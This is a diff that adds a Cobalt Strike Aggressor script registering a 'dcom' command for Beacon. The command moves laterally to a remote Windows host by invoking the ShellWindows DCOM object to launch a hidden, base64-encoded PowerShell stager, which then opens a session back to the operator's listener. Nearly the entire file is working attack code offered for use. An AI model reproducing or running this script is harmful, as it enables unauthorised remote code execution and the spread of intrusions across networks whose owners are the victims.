@@ -1,0 +1,27 @@
+alias dcom {
+
+	local('$shellcode $stager');
+	
+	if (listener_info($3) is $null) {
+		berror($1, "Listener $3 does not exist");
+		return;
+	}
+
+	if ($4 ne "x86" && $4 ne "x64") {
+		berror($1, "Invalid architecture");
+		return;
+	}
+	
+	btask($1, "Tasked Beacon to run " . listener_describe($3) . " on " . $2 . " via DCOM");
+
+	$shellcode = shellcode($3, "true", $4);
+	$stager = powershell_encode_stager($shellcode);
+
+	bpowerpick!($1, "\$COM = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',' $+ $2 $+ '); \$Obj = [System.Activator]::CreateInstance(\$COM); \$Item = \$Obj.Item(); \$Item.Document.Application.ShellExecute('powershell.exe', '-nop -w hidden -enc  $+ $stager $+ ', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\', \$null, 0)");
+
+	bstage($1, $2, $3, $4);
+}
+
+beacon_command_register("dcom", "Use DCOM to spawn a session on a host",
+	"Use: dcom [target] [listener] [arch]\n\n" .
+	"Spawn a session on a remote host. This command uses DCOM to run a PowerShell\none-liner to bootstrap the desired listener.");
